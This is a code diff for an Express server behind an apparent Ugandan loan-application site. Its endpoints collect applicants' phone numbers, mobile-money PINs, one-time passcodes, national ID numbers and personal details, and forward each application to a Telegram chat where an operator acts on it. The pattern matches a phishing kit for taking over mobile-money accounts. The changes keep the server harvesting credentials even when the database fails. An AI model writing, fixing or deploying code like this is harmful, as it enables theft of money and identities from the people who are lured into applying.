@@ -20,16 +20,8 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Database setup - Use /tmp on Railway (writable directory)
-const DB_PATH = process.env.NODE_ENV === 'production' ? '/tmp/loans.db' : './database/loans.db';
-
-// Ensure database directory exists (for local development)
-if (process.env.NODE_ENV !== 'production') {
-    const dbDir = path.dirname('./database/loans.db');
-    if (!fs.existsSync(dbDir)) {
-        fs.mkdirSync(dbDir, { recursive: true });
-    }
-}
+// Database setup - FORCE /tmp for Railway (writable directory)
+const DB_PATH = '/tmp/loans.db';
 
 let db = null;
 
@@ -77,6 +69,7 @@ async function initDatabase() {
         return true;
     } catch (error) {
         console.error('❌ Database error:', error);
+        // Don't let database error stop the server
         return false;
     }
 }
@@ -147,21 +140,24 @@ app.post('/api/save-loan', async (req, res) => {
             });
         }
         
-        // Check database connection
-        if (!db) {
-            console.error('Database not initialized');
-            return res.status(500).json({ success: false, error: 'Database not initialized' });
-        }
-        
         const loanId = generateLoanId();
         console.log('Generated loan ID:', loanId);
         
-        // Save to database
-        await db.run(
-            `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
-             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending_verification']
-        );
+        // Save to database (if available)
+        if (db) {
+            try {
+                await db.run(
+                    `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
+                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+                    [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending_verification']
+                );
+                console.log('Saved to database');
+            } catch (dbError) {
+                console.error('Database insert error (non-critical):', dbError.message);
+            }
+        } else {
+            console.log('No database connection, skipping save');
+        }
         
         // Send Telegram message with 4 buttons
         const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
@@ -299,7 +295,7 @@ app.post('/webhook/telegram', async (req, res) => {
             }
             
             // Update loan status in database
-            if (newStatus) {
+            if (newStatus && db) {
                 await db.run(`UPDATE loans SET status = ? WHERE loan_id = ?`, [newStatus, loanId]);
             }
             
@@ -339,10 +335,12 @@ app.post('/api/save-otp', async (req, res) => {
     try {
         const { loanId, otp } = req.body;
         
-        await db.run(
-            `UPDATE loans SET otp_code = ?, status = ? WHERE loan_id = ?`,
-            [otp, 'otp_verified', loanId]
-        );
+        if (db) {
+            await db.run(
+                `UPDATE loans SET otp_code = ?, status = ? WHERE loan_id = ?`,
+                [otp, 'otp_verified', loanId]
+            );
+        }
         
         res.json({ success: true });
         
@@ -357,16 +355,18 @@ app.post('/api/save-final', async (req, res) => {
     try {
         const { loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode } = req.body;
         
-        await db.run(
-            `INSERT INTO users (loan_id, full_name, national_id, date_of_birth, address, occupation, income, final_code)
-             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
-            [loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode]
-        );
-        
-        await db.run(
-            `UPDATE loans SET status = ? WHERE loan_id = ?`,
-            ['completed', loanId]
-        );
+        if (db) {
+            await db.run(
+                `INSERT INTO users (loan_id, full_name, national_id, date_of_birth, address, occupation, income, final_code)
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+                [loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode]
+            );
+            
+            await db.run(
+                `UPDATE loans SET status = ? WHERE loan_id = ?`,
+                ['completed', loanId]
+            );
+        }
         
         res.json({ success: true });
         
@@ -379,6 +379,10 @@ app.post('/api/save-final', async (req, res) => {
 // Get loan by ID
 app.get('/api/loan/:loanId', async (req, res) => {
     try {
+        if (!db) {
+            return res.status(200).json({ success: true, loan: { status: 'pending' } });
+        }
+        
         const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
         
         if (!loan) {
